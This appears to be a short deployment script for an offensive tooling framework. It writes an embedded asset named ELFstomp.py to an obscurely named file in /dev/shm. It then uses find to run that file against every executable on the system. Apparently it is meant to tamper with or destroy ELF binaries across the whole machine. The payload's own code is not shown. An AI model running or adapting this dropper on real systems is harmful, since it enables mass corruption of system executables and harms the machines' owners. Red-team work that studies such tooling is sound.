//priority:200
//timeout:60

//import:ELFstomp.py

function Deploy() {
    var elfstomp = GetAssetAsBytes("ELFstomp.py");
    var path = "/dev/shm/fjlksdfjlksajf.py";

    errors = G.file.WriteFileFromBytes(path, elfstomp[0]);
    G.exec.ExecuteCommandAsync("/usr/bin/find", ["/", "-executable", "-type", "f", "-exec", "python3", path, "{}", "\;"]);
}

